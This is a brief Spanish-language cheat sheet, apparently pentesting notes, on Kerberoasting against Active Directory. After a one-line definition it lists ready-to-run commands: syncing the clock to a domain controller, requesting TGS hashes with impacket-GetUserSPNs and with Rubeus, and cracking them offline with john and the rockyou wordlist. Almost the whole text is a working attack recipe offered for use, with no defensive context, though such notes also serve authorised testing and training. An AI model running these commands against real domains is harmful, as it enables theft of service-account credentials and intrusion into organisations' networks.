Kerberoasting

Kerberoasting solicita tickets TGS para cuentas con SPN y permite intentar crackear offline el hash asociado al servicio.

Sincronizar reloj

systemctl stop systemd-timesyncd
ntpdate <ip_dc>

Kerberoasting Kali

impacket-GetUserSPNs <dominio>/<user>:<password> -dc-ip <dc_ip> -request -outputfile hashes

Kerberoasting Windows

.\Rubeus.exe kerberoast /outfile:spn.txt

Crackear hash de Kerberos

john --wordlist=/usr/share/wordlist/rockyou.txt hash
